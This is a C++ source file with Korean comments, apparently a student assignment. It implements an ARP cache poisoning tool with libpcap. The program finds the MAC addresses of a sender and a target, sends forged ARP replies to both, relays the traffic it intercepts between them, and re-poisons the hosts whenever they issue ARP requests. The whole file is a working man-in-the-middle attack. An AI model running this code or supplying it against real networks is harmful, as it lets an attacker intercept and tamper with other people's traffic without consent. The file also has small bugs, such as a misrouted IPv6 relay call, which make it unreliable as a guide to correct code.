#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <iostream>
#include <list>
using namespace std;
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)
typedef struct{
	char * dev_;
}Param;
Param param = {
	.dev_=NULL
};
//ARP-TABLE의 요소
struct ARP_TABLE
{
    Mac mac_a;
	Ip ip_a;
};
//Mac Address를 가져오는 함수
int Mac_Address_(unsigned char* mac,char * ip,const char * interface);
void usage();
Mac find_mac_address(Ip ip, pcap_t* handle, char* dev, Mac My_Mac_Address, Ip My_Ip_Address);
void sender_arp_attack(list<ARP_TABLE> &arp_list,pcap_t* handle);
void target_arp_attack(list<ARP_TABLE> &arp_list,pcap_t* handle);
int continue_attack(list<ARP_TABLE> &arp_list,pcap_t* handle);
void check_unicast_broadcast_packet(list<ARP_TABLE> &arp_list,pcap_t* handle);
void answer_unicast(list<ARP_TABLE> &arp_list,pcap_t*handle,int distinguish);
void relay_sender_to_target(list<ARP_TABLE> &arp_list,u_char * packet,pcap_t* handle,int length);
void relay_target_to_sender(list<ARP_TABLE> &arp_list,u_char * packet,pcap_t* handle,int length);
void check_packet(list<ARP_TABLE>&arp_list,pcap_t*handle);
int main(int argc, char* argv[]) {
	//list의 형태로 arp-table을 구성
	//첫번쨰는 나의 ip
	//두번쨰는 sender의 ip
	//세번째는 target의 ip
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
	list<ARP_TABLE> Arp_Table_;
    char * dev = argv[1];
    //나의 MAC , IP 입력
	unsigned char mac_[6];
	char ip_[40];
	Mac_Address_(mac_,ip_,dev);
    Mac My_Mac_Address_ = Mac(mac_);
    ARP_TABLE temp;
	temp.mac_a = My_Mac_Address_;
	temp.ip_a = htonl(Ip(ip_));
	Arp_Table_.push_back(temp);

	if(argc <4)
	{
	    usage();
	    return -1;
	}
	if((argc)%2==1)
	{
	    usage();
	    return -1;
	}
	else
	{
        for(int i = 2; i<argc;i++)
        {
            ARP_TABLE temp;
            temp.ip_a = htonl(Ip(string(argv[i])));
            Arp_Table_.push_back(temp);
        }
	}
	//내가 입력한 IP에 대해서 MAC주소를 찾음.
	//만약 Mac의 주소가 00:00:00:00:00:00이 나오게 된다면 이를 못찾는 것으로 판단하고 프로그램을 종료시킴
	list<ARP_TABLE>::iterator iter = Arp_Table_.begin();
	iter++;
	Mac search_mac;
    for(iter;iter!=Arp_Table_.end();iter++)
    {
        ARP_TABLE temp_src = *iter;
        search_mac = find_mac_address(temp_src.ip_a,handle,dev,My_Mac_Address_,htonl(Ip(ip_)));
        if(search_mac == Mac("00:00:00:00:00:00"))
        {
            printf("CAN'T FIND MAC ADDRESS \n");
            return 1;
        }
        (*iter).mac_a = search_mac;
    }
    //sender의 arp를 변조시킵니다.
    //1. 공격
    //2. 패킷 받기
    //  - 재감염
    //  - relay
    sender_arp_attack(Arp_Table_,handle);
    target_arp_attack(Arp_Table_,handle);
    check_packet(Arp_Table_,handle);
    pcap_close(handle);
}
void check_packet(list<ARP_TABLE>&arp_list,pcap_t*handle)
{
    //1.packet을 전부 검사
    const struct EthHdr * ethHdr_;
    const struct EthArpPacket * etharppacket_;
    list<ARP_TABLE>::iterator iter = arp_list.begin();
    ARP_TABLE my_address = *iter;
    ARP_TABLE sender_address;
    ARP_TABLE target_address;
    iter++;
    sender_address = *iter;
    iter++;
    target_address = *iter;

    //1.pcap_test에서 사용했던 코드로서 모든 패킷을 잡아야함.
    while(true)
    {
        struct pcap_pkthdr* header;
        const u_char * packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res==0) continue;
        if (res==PCAP_ERROR || res==PCAP_ERROR_BREAK)
        {
            printf("\npcap_next_ex return %d(%s)\n",res,pcap_geterr(handle));
            break;
        }
        int length = header->caplen;
        //2.etherheader를 통해서 arp ip ip6
        ethHdr_ = (struct EthHdr *)(packet);
        etharppacket_ = (struct EthArpPacket *)(packet);
        //ipv4일떄
        if(ntohs(ethHdr_->type_)==0x0800)
        {
            //relay sender -> target
            if(ethHdr_->smac_ == sender_address.mac_a)
            {
                u_char * packet_casting = (u_char*)packet;
                relay_sender_to_target(arp_list,packet_casting,handle,length);
            }
            //relay target -> sender
            if(ethHdr_->smac_ == target_address.mac_a)
            {
                u_char * packet_casting = (u_char*)packet;
                relay_target_to_sender(arp_list,packet_casting,handle,length);
            }
        }
        //ipv6일때
        if(ntohs(ethHdr_->type_)==0x86DD)
        {
            //relay sender -> target
            if(ethHdr_->smac_ == sender_address.mac_a)
            {
                u_char * packet_casting = (u_char*)packet;
                relay_sender_to_target(arp_list,packet_casting,handle,length);
            }
            //relay target -> sender
            if(ethHdr_->smac_ == target_address.mac_a)
            {
                u_char * packet_casting = (u_char*)packet;
                relay_sender_to_target(arp_list,packet_casting,handle,length);
            }
        }
        //arp일떄
        if(ntohs(ethHdr_->type_)==0x0806)
        {
            //reinfection
            //1. unicast
            //arp sender -> target(me)
            if(etharppacket_->arp_.smac_ == sender_address.mac_a && etharppacket_->arp_.tmac_ == my_address.mac_a)
            {
                sender_arp_attack(arp_list,handle);
            }
            //arp target -> sender(me)
            if(etharppacket_->arp_.smac_ == target_address.mac_a && etharppacket_->arp_.tmac_ == my_address.mac_a )
            {
                target_arp_attack(arp_list,handle);
            }
            //2. broadcast
            //arp sender -> broadcast
            if(ethHdr_->smac_ == sender_address.mac_a && ethHdr_->dmac_ == Mac("ff:ff:ff:ff:ff:ff"))
            {
                sender_arp_attack(arp_list,handle);
            }
            //arp target -> broadcast
            if(ethHdr_->smac_ == target_address.mac_a && ethHdr_->dmac_ == Mac("ff:ff:ff:ff:ff:ff"))
            {
                target_arp_attack(arp_list,handle);
            }
        }
    }
}
void relay_target_to_sender(list<ARP_TABLE>&arp_list,u_char * packet, pcap_t*handle,int length)
{
    struct EthHdr * ethHdr_;
    list<ARP_TABLE>::iterator iter = arp_list.begin();
    ARP_TABLE my_address = *iter;
    ARP_TABLE sender_address;
    ARP_TABLE target_address;
    iter++;
    sender_address = *iter;
    iter++;
    target_address = *iter;

    u_char * copy_packet = NULL;
    copy_packet = packet;
    ethHdr_ = (struct EthHdr *)copy_packet;

    ethHdr_->smac_ = my_address.mac_a;
    ethHdr_->dmac_ = sender_address.mac_a;

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(copy_packet), length);

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

}

void relay_sender_to_target(list<ARP_TABLE>&arp_list,u_char * packet, pcap_t*handle,int length)
{
    struct EthHdr * ethHdr_;
    list<ARP_TABLE>::iterator iter = arp_list.begin();
    ARP_TABLE my_address = *iter;
    ARP_TABLE sender_address;
    ARP_TABLE target_address;
    iter++;
    sender_address = *iter;
    iter++;
    target_address = *iter;

    u_char * copy_packet = NULL;
    copy_packet = packet;
    ethHdr_ = (struct EthHdr *)copy_packet;
    printf("\n\n\n\n");
    std::cout << std::string(ethHdr_->smac()) << std::endl;
    std::cout << std::string(ethHdr_->dmac()) << std::endl;

    std::cout << std::string(sender_address.mac_a) << std::endl;
    std::cout << std::string(my_address.mac_a) << std::endl;
    ethHdr_->smac_ = my_address.mac_a;
    ethHdr_->dmac_ = target_address.mac_a;

    std::cout << std::string(ethHdr_->smac()) << std::endl;
    std::cout << std::string(ethHdr_->dmac()) << std::endl;
    printf("\n\n\n\n");
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(copy_packet), length);

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
//sender 공격을 보내는 함수
void sender_arp_attack(list<ARP_TABLE> &arp_list,pcap_t* handle)
{
    list<ARP_TABLE>::iterator iter = arp_list.begin();
    ARP_TABLE my_address = *iter;
    ARP_TABLE sender_address;
    ARP_TABLE target_address;
    EthArpPacket packet;
    iter++;
    for(iter;iter!=arp_list.end();iter++)
    {
        sender_address = *iter;
        iter++;
        target_address = *iter;
        iter--;

        packet.eth_.dmac_ = sender_address.mac_a;
        packet.eth_.smac_ = my_address.mac_a;
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = my_address.mac_a; //나의 맥주소
        packet.arp_.sip_ = target_address.ip_a;//게이트웨이의 아이피
        packet.arp_.tmac_ = sender_address.mac_a; //상대방 mac주소
        packet.arp_.tip_ = sender_address.ip_a; //상대방 아이피 입력

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
}
//target 공격을 보내는 함수
void target_arp_attack(list<ARP_TABLE> &arp_list,pcap_t* handle)
{
    list<ARP_TABLE>::iterator iter = arp_list.begin();
    ARP_TABLE my_address = *iter;
    ARP_TABLE sender_address;
    ARP_TABLE target_address;
    EthArpPacket packet;
    iter++;
    for(iter;iter!=arp_list.end();iter++)
    {
        sender_address = *iter;
        iter++;
        target_address = *iter;
        iter--;

        packet.eth_.dmac_ = target_address.mac_a;
        packet.eth_.smac_ = my_address.mac_a;
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = my_address.mac_a; //나의 맥주소
        packet.arp_.sip_ = sender_address.ip_a;//게이트웨이의 아이피
        packet.arp_.tmac_ = target_address.mac_a; //상대방 mac주소
        packet.arp_.tip_ = target_address.ip_a; //상대방 아이피 입력

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
}

//Mac Address를 가져오는 함수
int Mac_Address_(unsigned char* mac,char * ip,const char * interface)
{
    int sock_;//소켓 디스크립터 변수
    struct ifreq ifr_; //ifreq구조체 변수
    int fd_;
    char * my_mac_;
	//char * my_ip_;
    //ifr_ 구조체 변수 초기화
    memset(&ifr_,0x00,sizeof(ifr_));
    strcpy(ifr_.ifr_name,interface);
    fd_ = socket(AF_INET,SOCK_STREAM,0);//소캣생성
    sock_ = socket(AF_INET,SOCK_STREAM,0);//소캣생성

    if(sock_<0)
    {
        printf("SOCKET ERROR \n");
        return 1;
    }
    if(ioctl(fd_,SIOCGIFHWADDR,&ifr_)<0)
    {
        printf("IOCTL ERROR \n");
        return 1;
    }
    //소캣을 이용해서 나의 Mac주소를 확인
    my_mac_ = ifr_.ifr_hwaddr.sa_data;

    mac[0] = (unsigned)my_mac_[0];
    mac[1] = (unsigned)my_mac_[1];
    mac[2] = (unsigned)my_mac_[2];
    mac[3] = (unsigned)my_mac_[3];
    mac[4] = (unsigned)my_mac_[4];
    mac[5] = (unsigned)my_mac_[5];

	inet_ntop(AF_INET,ifr_.ifr_addr.sa_data+2,ip,sizeof(struct sockaddr));
    close(sock_);
    return 0;
}

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ... ]\n");
	printf("sample: send-arp-test wlan0\n");
}

Mac find_mac_address(Ip ip, pcap_t* handle, char* dev, Mac My_Mac_Address, Ip My_Ip_Address){
    Mac result=Mac("00:00:00:00:00:00");
    const struct EthArpPacket * etharppacket_;
	char errbuf[PCAP_ERRBUF_SIZE];

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return result;
	}
    //request를 통해서 상대방의 Mac주소를 알아오기
    EthArpPacket packet_;

    packet_.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //BroadCast공격
    packet_.eth_.smac_= My_Mac_Address;
    packet_.eth_.type_ = htons(EthHdr::Arp);
    packet_.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet_.arp_.pro_ = htons(EthHdr::Ip4);
    packet_.arp_.hln_ = Mac::SIZE;
    packet_.arp_.pln_ = Ip::SIZE;
	packet_.arp_.op_ = htons(ArpHdr::Request);
	packet_.arp_.smac_ = My_Mac_Address;
    packet_.arp_.sip_ = My_Ip_Address;//내 아이피 입력
	packet_.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet_.arp_.tip_ = ip;//상대방의 아이피 입력

	//상대방의 맥주소
	EthArpPacket who_is_packet_ ;
	who_is_packet_.arp_.sip_ = ip;
	//----------------------추가사항-----------------------------------
    //원래 packet의 해더를 확인해서 arp패킷이면 열어봐야된다는 정보가 추가해야함 +++
    //스레드이용 ? 자세히몰라서 물어봐야함 +++

    int res_ = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_), sizeof(EthArpPacket));

    if (res_ != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_, pcap_geterr(handle));
	}
	//수신하는 패킷의 IP가 상대방의 IP와 일치할 경우, 해당 패킷의 Mac주소를 가져옴.
	while (true)
	{
		struct pcap_pkthdr * re_header_;
		const u_char * re_packet_;
		int re_res_ = pcap_next_ex(handle, &re_header_,&re_packet_);
		if(re_res_ == 0) continue;
		if (re_res_ == PCAP_ERROR || re_res_ == PCAP_ERROR_BREAK)
		{
			printf("\npcap_next_ex return %d(%s)\n",res_,pcap_geterr(handle));
			break;
		}
		etharppacket_=(struct EthArpPacket*)(re_packet_);

		if(etharppacket_->arp_.sip_==who_is_packet_.arp_.sip_)
		{
			result = etharppacket_ -> eth_.smac_;
			break;
		}
	}
    return result;
}